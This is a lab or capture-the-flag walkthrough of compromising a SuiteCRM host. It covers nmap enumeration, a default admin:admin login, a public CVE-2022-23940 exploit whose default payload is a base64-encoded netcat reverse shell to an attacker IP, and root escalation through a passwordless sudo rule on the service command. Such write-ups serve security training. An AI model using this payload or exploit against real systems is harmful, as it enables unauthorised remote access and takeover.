## First enumeration with nmap

```shell
# Nmap 7.94SVN scan initiated Fri Mar  1 12:14:31 2024 as: nmap -sC -sV -T4 -oN normal.txt -p 22,80,3306,33060 -Pn 192.168.227.146
Nmap scan report for 192.168.227.146
Host is up (0.13s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 37:80:01:4a:43:86:30:c9:79:e7:fb:7f:3b:a4:1e:dd (RSA)
|   256 b6:18:a1:e1:98:fb:6c:c6:87:55:45:10:c6:d4:45:b9 (ECDSA)
|_  256 ab:8f:2d:e8:a2:04:e7:b7:65:d3:fe:5e:93:1e:03:67 (ED25519)
80/tcp    open  http    Apache httpd 2.4.38 ((Debian))
| http-title: SuiteCRM
|_Requested resource was index.php?action=Login&module=Users
|_http-server-header: Apache/2.4.38 (Debian)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
3306/tcp  open  mysql   MySQL (unauthorized)
33060/tcp open  mysqlx?
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port33060-TCP:V=7.94SVN%I=7%D=3/1%Time=65E1B8A3%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,9,"\x05\0\0\0\x0b\x08\x05\x1a\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Mar  1 12:17:44 2024 -- 1 IP address (1 host up) scanned in 193.55 seconds

```

## Enumerating port 80

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/dca21234-2ff8-4a8b-a2bd-4eea17d8bb17)

a web server is running on port `80`, openning it on a browser, we an see it is running `suitecrm` service. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/3461072b-28cf-4d22-a27a-f17a9ed764fe)

trying default creds `admin:admin` and we are able to login to the administrator panel. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/36d759a8-df8a-4025-8f03-e74215e60dd0)

checking for `suitecrm` exploit, we got an exploit on searchsploit. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/a8722ae5-0423-4662-a5b6-38a8bb78ebc6)

the searchsploit exploit did not work, found another exploit on github. [exploit](https://github.com/manuelz120/CVE-2022-23940). 

```python
@click.command("CVE-2022-23940",
               epilog="https://github.com/manuelz120/CVE-2022-23940")
@click.option(
    "--host",
    '-h',
    default="http://192.168.227.146",
    help="Root of SuiteCRM installation. Defaults to http://localhost")
@click.option("--username", '-u', prompt="Username> ", help="Username")
@click.option("--password",
              '-p',
              prompt="Password> ",
              help="password",
              hide_input=True)
@click.option("--payload",
              '-P',
              help="Shell command to be executed on target system",
              default='echo cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL2Jhc2ggLWkgMj4mMXxuYyAxOTIuMTY4LjQ1LjIxOCA0NDMgPi90bXAvZg== | base64 -d|bash')
@click.option("--is_core",
              '-d',
              default=False,
              help="SuiteCRM Core (>= 8.0.0). Defaults to False")
```
modified this path of the exploit

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c8bc90a9-2588-4dba-9282-3bea870ffd3f)

ran the exploit and got a reverse shell. 


## Privilege Escalation 

```shell
www-data@crane:/var/www/html$ sudo -l 
Matching Defaults entries for www-data on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/sbin/service
www-data@crane:/var/www/html$ 
```
checking for sudo permissions, we can see we can run `/usr/sbin/service` as root without password. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/d90b4b5f-0b67-4434-bdb2-e19d89874076)

abusing the permission, we got root shell. 

![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/72e74303-7fe3-4530-a934-aa5cd541714e)

and we are through 🙂
